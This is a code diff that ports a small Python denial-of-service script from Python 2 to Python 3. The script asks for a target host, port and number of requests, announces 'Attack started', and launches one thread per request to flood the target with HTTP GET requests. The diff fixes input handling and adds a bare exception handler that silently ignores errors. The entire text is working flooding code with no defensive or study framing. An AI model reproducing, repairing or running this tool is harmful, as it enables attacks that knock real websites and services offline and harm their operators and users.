@@ -26,10 +26,12 @@ def attack():
      # Creating a soccket
     dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        dos.connect((ip, port))
+        dos.connect((ip,int( port)))
         dos.send("GET /%s HTTP/1.1\nHost: %s \n\n" % (url_path, host))
     except socket.error:
         print("\33[91;1mNo connection, server may be down \33[00m")
+    except:
+        pass
     finally:
         dos.shutdown(socket.SHUT_RDWR)
         dos.close()
@@ -39,9 +41,9 @@ def ddos():
     global port
     global ip
     global num_requests
-    host = raw_input(using + 'host<( ')
-    port = input(using + 'port<( ')
-    num_requests = input(using + 'requests<( ')
+    host = input(using + 'host<( ')
+    port = int(input(using + 'port<( '))
+    num_requests = int(input(using + 'requests<( '))
     try:
         host = str(host).replace("https://", "").replace("http://", "").replace("www.", "")
         ip = socket.gethostbyname(host)
@@ -51,7 +53,7 @@ def ddos():
     print("[^] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests))
     time.sleep(3)
     all_threads = []
-    for i in xrange(num_requests):
+    for i in range(num_requests):
         t1 = threading.Thread(target=attack)
         t1.start()
         all_threads.append(t1)
